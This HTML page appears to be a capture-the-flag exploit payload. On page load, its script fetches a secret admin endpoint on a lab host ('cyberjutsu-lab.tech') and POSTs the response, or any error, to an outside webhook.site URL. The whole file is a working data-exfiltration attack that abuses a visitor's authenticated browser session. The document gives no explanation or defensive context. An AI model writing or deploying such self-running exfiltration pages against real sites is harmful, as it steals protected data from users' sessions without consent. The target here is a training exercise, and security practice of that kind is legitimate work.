<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exfiltrating Flag via POST</title>
</head>
<body>
    <h1>Flag Stealing In Progress</h1>
    <script>
        (function () {
            const webhook = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
            const flagURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";

            function sendToWebhook(data) {
                fetch(webhook, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                }).catch(e => console.error("Webhook error", e));
            }

            fetch(flagURL)
                .then(res => res.json())
                .then(json => {
                    sendToWebhook({
                        stage: "FLAG2_RETRIEVED_SUCCESS",
                        flag_payload: json
                    });
                })
                .catch(err => {
                    sendToWebhook({
                        stage: "FETCH_ERROR",
                        error: err.toString()
                    });
                });
        })();
    </script>
</body>
</html>
